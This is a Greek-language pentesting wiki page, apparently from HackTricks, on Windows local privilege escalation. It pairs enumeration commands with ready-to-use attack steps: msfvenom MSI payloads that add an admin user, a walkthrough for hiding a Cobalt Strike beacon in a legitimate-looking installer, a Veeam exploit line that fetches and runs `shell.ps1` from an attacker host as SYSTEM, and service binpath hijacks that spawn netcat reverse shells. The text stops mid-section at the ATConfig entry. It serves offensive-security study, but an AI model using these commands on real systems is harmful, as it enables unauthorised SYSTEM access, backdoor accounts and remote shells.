# Windows Τοπική Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για να εντοπίσετε Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική Windows Θεωρία

### Access Tokens

**Αν δεν γνωρίζεις τι είναι τα Windows Access Tokens, διάβασε την ακόλουθη σελίδα πριν συνεχίσεις:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Ελέγξτε την ακόλουθη σελίδα για περισσότερες πληροφορίες σχετικά με ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Αν δεν γνωρίζεις τι είναι τα integrity levels στα Windows, θα πρέπει να διαβάσεις την ακόλουθη σελίδα πριν συνεχίσεις:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Υπάρχουν διάφορα πράγματα στα Windows που θα μπορούσαν να **σας εμποδίσουν να απαριθμήσετε το σύστημα**, να εκτελέσετε executables ή ακόμα και να **εντοπίσουν τις δραστηριότητές σας**. Θα πρέπει να **διαβάσετε** την ακόλουθη **σελίδα** και να **απαριθμήσετε** όλους αυτούς τους **μηχανισμούς άμυνας** πριν ξεκινήσετε την απαρίθμηση για privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Τα UIAccess processes που εκκινούνται μέσω του `RAiLaunchAdminProcess` μπορούν να γίνουν αντικείμενο abuse για να φτάσουν High IL χωρίς prompts όταν παρακάμπτονται οι AppInfo secure-path checks. Δείτε το ειδικό UIAccess/Admin Protection bypass workflow εδώ:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Το Secure Desktop accessibility registry propagation μπορεί να γίνει αντικείμενο abuse για arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή vulnerability (ελέγξτε επίσης τα patches που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμο για να αναζητάς λεπτομερείς πληροφορίες σχετικά με ευπάθειες ασφάλειας της Microsoft. Αυτή η βάση δεδομένων έχει περισσότερες από 4,700 ευπάθειες ασφάλειας, δείχνοντας την **τεράστια attack surface** που παρουσιάζει ένα Windows environment.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Any credential/Juicy info saved in the env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία PowerShell Transcript

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Καταγραφή PowerShell Module

Οι λεπτομέρειες των εκτελέσεων του PowerShell pipeline καταγράφονται, συμπεριλαμβανομένων των εντολών που εκτελέστηκαν, των κλήσεων εντολών και τμημάτων των scripts. Ωστόσο, οι πλήρεις λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου ενδέχεται να μην καταγράφονται.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 events από τα PowersShell logs μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται μια πλήρης καταγραφή της δραστηριότητας και όλου του περιεχομένου της εκτέλεσης του script, διασφαλίζοντας ότι κάθε block code τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο audit trail κάθε δραστηριότητας, πολύτιμο για forensics και για την ανάλυση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλης της δραστηριότητας τη στιγμή της εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα συμβάντα καταγραφής για το Script Block μπορούν να εντοπιστούν στο Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Δίσκοι
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείς να θέσεις σε κίνδυνο το σύστημα αν τα updates δεν ζητούνται με χρήση http**S** αλλά http.

Ξεκινάς ελέγχοντας αν το network χρησιμοποιεί ένα non-SSL WSUS update εκτελώντας το παρακάτω στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή το παρακάτω σε PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Αν λάβετε μια απάντηση όπως μία από αυτές:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσο με `1`.

Τότε, **είναι exploitable.** Αν το τελευταίο registry είναι ίσο με 0, τότε η WSUS καταχώρηση θα αγνοηθεί.

Για να exploit αυτές τις vulnerabilities μπορείς να χρησιμοποιήσεις tools όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Αυτά είναι MiTM weaponized exploits scripts για να inject 'fake' updates σε non-SSL WSUS traffic.

Διάβασε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διάβασε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτό είναι το flaw που exploit αυτό το bug:

> Αν έχουμε τη δυνατότητα να modify το τοπικό user proxy μας, και τα Windows Updates χρησιμοποιούν το proxy που έχει ρυθμιστεί στις Internet Explorer settings, τότε έχουμε τη δυνατότητα να τρέξουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά για να intercept τα δικά μας traffic και να τρέξουμε code ως elevated user στο asset μας.
>
> Επιπλέον, αφού το WSUS service χρησιμοποιεί τις ρυθμίσεις του current user, θα χρησιμοποιήσει επίσης το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το WSUS hostname και προσθέσουμε αυτό το certificate στο certificate store του current user, θα μπορέσουμε να intercept τόσο HTTP όσο και HTTPS WSUS traffic. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να εφαρμόσει μια trust-on-first-use type validation στο certificate. Αν το certificate που παρουσιάζεται είναι trusted από τον user και έχει το σωστό hostname, θα γίνει accepted από το service.

Μπορείς να exploit αυτή τη vulnerability χρησιμοποιώντας το tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (όταν απελευθερωθεί).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Πολλοί enterprise agents εκθέτουν ένα localhost IPC surface και ένα privileged update channel. Αν το enrollment μπορεί να εξαναγκαστεί σε attacker server και το updater εμπιστεύεται ένα rogue root CA ή weak signer checks, ένας local user μπορεί να deliver ένα malicious MSI που το SYSTEM service εγκαθιστά. Δες μια generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Το Veeam B&R < `11.0.1.1261` εκθέτει μια localhost service στο **TCP/9401** που processes attacker-controlled messages, επιτρέποντας arbitrary commands ως **NT AUTHORITY\SYSTEM**.

- **Recon**: επιβεβαίωσε τον listener και την version, π.χ. `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: τοποθέτησε ένα PoC όπως `VeeamHax.exe` με τα απαιτούμενα Veeam DLLs στον ίδιο φάκελο, και μετά trigger ένα SYSTEM payload μέσω του local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Η υπηρεσία εκτελεί την εντολή ως SYSTEM.
## KrbRelayUp

Υπάρχει μια ευπάθεια **local privilege escalation** σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες συνθήκες. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου το **LDAP signing** δεν επιβάλλεται, οι χρήστες διαθέτουν self-rights που τους επιτρέπουν να ρυθμίσουν **Resource-Based Constrained Delegation (RBCD),** και τη δυνατότητα των χρηστών να δημιουργούν computers μέσα στο domain. Είναι σημαντικό να σημειωθεί ότι αυτές οι **requirements** ικανοποιούνται με τις **default settings**.

Βρες το **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης δες [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Αν** αυτά τα 2 registers είναι **enabled** (η τιμή είναι **0x1**), τότε χρήστες οποιουδήποτε privilege μπορούν να **install** (execute) `*.msi` files ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. This script writes out a precompiled MSI installer that prompts for a user/group addition (so you will need GIU access):
```
Write-UserAddMSI
```
Απλώς εκτέλεσε το δημιουργημένο binary για να κλιμακώσεις προνόμια.

### MSI Wrapper

Διάβασε αυτό το tutorial για να μάθεις πώς να δημιουργήσεις ένα MSI wrapper χρησιμοποιώντας αυτό το tools. Σημείωσε ότι μπορείς να κάνεις wrap ένα "**.bat**" file αν απλώς θέλεις να **εκτελέσεις** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** με Cobalt Strike ή Metasploit ένα **new Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
- Άνοιξε το **Visual Studio**, επίλεξε **Create a new project** και πληκτρολόγησε "installer" στο search box. Επίλεξε το **Setup Wizard** project και κάνε κλικ στο **Next**.
- Δώσε στο project ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποίησε το **`C:\privesc`** για το location, επίλεξε **place solution and project in the same directory**, και κάνε κλικ στο **Create**.
- Συνέχισε να κάνεις κλικ στο **Next** μέχρι να φτάσεις στο βήμα 3 από 4 (choose files to include). Κάνε κλικ στο **Add** και επίλεξε το Beacon payload που μόλις δημιούργησες. Έπειτα κάνε κλικ στο **Finish**.
- Επίλεξε το project **AlwaysPrivesc** στο **Solution Explorer** και στις **Properties**, άλλαξε το **TargetPlatform** από **x86** σε **x64**.
- Υπάρχουν και άλλες properties που μπορείς να αλλάξεις, όπως ο **Author** και ο **Manufacturer**, οι οποίες μπορούν να κάνουν την εγκατεστημένη app να φαίνεται πιο νόμιμη.
- Κάνε δεξί κλικ στο project και επίλεξε **View > Custom Actions**.
- Κάνε δεξί κλικ στο **Install** και επίλεξε **Add Custom Action**.
- Κάνε διπλό κλικ στο **Application Folder**, επίλεξε το αρχείο σου **beacon.exe** και κάνε κλικ στο **OK**. Αυτό θα διασφαλίσει ότι το beacon payload θα εκτελεστεί μόλις τρέξει ο installer.
- Στις **Custom Action Properties**, άλλαξε το **Run64Bit** σε **True**.
- Τέλος, **build it**.
- Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιώσου ότι έθεσες την πλατφόρμα σε x64.

### MSI Installation

Για να εκτελέσεις την **installation** του κακόβουλου `.msi` file στο **background**:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτήν την ευπάθεια μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και Detectors

### Audit Settings

Αυτές οι ρυθμίσεις καθορίζουν τι καταγράφεται, οπότε θα πρέπει να δώσετε προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Το Windows Event Forwarding είναι ενδιαφέρον να γνωρίζετε πού αποστέλλονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** έχει σχεδιαστεί για τη **διαχείριση των κωδικών πρόσβασης του τοπικού Administrator**, διασφαλίζοντας ότι κάθε κωδικός πρόσβασης είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που είναι joined to a domain. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια μέσα στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες που έχουν λάβει επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να δουν local admin passwords αν είναι authorized.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Αν είναι ενεργό, οι **plain-text passwords αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες για το WDigest σε αυτή τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Προστασία LSA

Ξεκινώντας με τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για την Local Security Authority (LSA) ώστε να **μπλοκάρει** προσπάθειες από μη έμπιστες διεργασίες να **διαβάσουν τη μνήμη της** ή να κάνουν inject code, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για την Προστασία LSA εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

Το **Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα credentials που είναι αποθηκευμένα σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash.| [**Περισσότερες πληροφορίες για το Credentials Guard εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Τα **Domain credentials** αυθεντικοποιούνται από την **Local Security Authority** (LSA) και χρησιμοποιούνται από τα components του λειτουργικού συστήματος. Όταν τα logon data ενός χρήστη αυθεντικοποιούνται από ένα registered security package, συνήθως δημιουργούνται domain credentials για τον χρήστη.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Απαρίθμηση Users & Groups

Θα πρέπει να ελέγξετε αν κάποια από τα groups όπου ανήκετε έχουν ενδιαφέροντα permissions
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

Αν **ανήκεις σε κάποια privileged group μπορεί να είσαι σε θέση να escalate privileges**. Μάθε για privileged groups και πώς να τις abuse για να escalate privileges εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Μάθε περισσότερα** για το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δες την παρακάτω σελίδα για να **μάθεις για ενδιαφέροντα tokens** και πώς να τα abuse:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Φάκελοι Home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Password
```bash
net accounts
```
### Πάρε το περιεχόμενο του clipboard
```bash
powershell -command "Get-Clipboard"
```
## Εκτελούμενες Διαδικασίες

### Δικαιώματα Αρχείων και Φακέλων

Πρώτα απ’ όλα, όταν παραθέτεις τις διεργασίες **έλεγξε για κωδικούς μέσα στη γραμμή εντολών της διεργασίας**.\
Έλεγξε αν μπορείς να **αντικαταστήσεις κάποιο εκτελούμενο binary** ή αν έχεις δικαιώματα εγγραφής στον φάκελο του binary για να εκμεταλλευτείς πιθανά [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Πάντα έλεγχε για πιθανούς [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των binaries των διεργασιών**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των binaries των processes (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Εξόρυξη Password από μνήμη

Μπορείς να δημιουργήσεις ένα memory dump ενός running process χρησιμοποιώντας το **procdump** από sysinternals. Services όπως το FTP έχουν τα **credentials σε clear text στη μνήμη**, δοκίμασε να κάνεις dump τη μνήμη και να διαβάσεις τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**Οι εφαρμογές που εκτελούνται ως SYSTEM μπορεί να επιτρέπουν σε έναν χρήστη να ανοίξει ένα CMD, ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζήτησε "command prompt", κάνε click στο "Click to open Command Prompt"

## Services

Τα Service Triggers επιτρέπουν στο Windows να ξεκινήσει ένα service όταν συμβούν ορισμένες συνθήκες (activity named pipe/RPC endpoint, ETW events, IP availability, device arrival, GPO refresh, κ.λπ.). Ακόμα και χωρίς δικαιώματα SERVICE_START μπορείς συχνά να ξεκινήσεις privileged services ενεργοποιώντας τα triggers τους. Δες τεχνικές enumeration και activation εδώ:

-
{{#ref}}
service-triggers.md
{{#endref}}

Λάβε μια λίστα με services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείς να χρησιμοποιήσεις το **sc** για να λάβεις πληροφορίες για μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγχετε το απαιτούμενο επίπεδο privilege για κάθε service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν κάποια υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

Αν έχετε αυτό το σφάλμα (για παράδειγμα με SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Μπορείτε να το ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από το SSDPSRV για να λειτουργήσει (για XP SP1)**

**Ένας άλλος workaround** για αυτό το πρόβλημα είναι να εκτελέσετε:
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση διαδρομής δυαδικού αρχείου υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου δυαδικού αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα privileges μπορούν να κλιμακωθούν μέσω διαφόρων permissions:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την επαναδιαμόρφωση του service binary.
- **WRITE_DAC**: Ενεργοποιεί την επαναδιαμόρφωση permissions, οδηγώντας στη δυνατότητα αλλαγής των service configurations.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ownership και την επαναδιαμόρφωση permissions.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των service configurations.
- **GENERIC_ALL**: Επίσης κληρονομεί τη δυνατότητα αλλαγής των service configurations.

Για την ανίχνευση και εκμετάλλευση αυτής της ευπάθειας, το _exploit/windows/local/service_permissions_ μπορεί να χρησιμοποιηθεί.

### Services binaries weak permissions

**Έλεγξε αν μπορείς να τροποποιήσεις το binary που εκτελείται από ένα service** ή αν έχεις **write permissions στον φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείς να πάρεις κάθε binary που εκτελείται από ένα service χρησιμοποιώντας **wmic** (όχι στο system32) και να ελέγξεις τα permissions σου χρησιμοποιώντας **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης registry υπηρεσιών

You should check if you can modify any service registry.\
You can **check** your **permissions** over a service **registry** doing:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Θα πρέπει να ελεγχθεί αν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** διαθέτουν δικαιώματα `FullControl`. Αν ναι, το binary που εκτελείται από την υπηρεσία μπορεί να τροποποιηθεί.

Για να αλλάξετε το Path του εκτελούμενου binary:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Ορισμένα Windows Accessibility features δημιουργούν per-user **ATConfig** keys που αργότερα αντιγράφονται από μια **SYSTEM** process σε ένα HKLM session key. Ένα registry **symbolic link race** μπορεί να ανακατευθύνει αυτό το privileged write σε **οποιοδήποτε HKLM path**, δίνοντας ένα arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

